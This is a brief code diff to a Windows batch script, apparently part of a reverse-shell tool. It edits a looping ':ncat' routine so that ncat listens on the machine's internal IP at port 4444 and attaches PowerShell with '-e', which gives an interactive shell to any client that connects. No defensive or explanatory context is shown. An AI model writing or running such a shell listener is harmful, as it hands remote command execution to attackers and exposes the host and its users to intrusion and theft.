@@ -13,7 +13,7 @@ goto :reverseshell
 :ncat
 cls
 timeout /t 1 > nul
-for %%b in ("%windir%\System32\WindowsPowerShell\v1.0\powershell") do (ncat -l %myipinternal% -v -e %%b)
+for %%b in ("%windir%\System32\WindowsPowerShell\v1.0\powershell") do (ncat -l %myipinternal% 4444 -v -e %%b)
 timeout /t 1 > nul
 cls
 goto :ncat
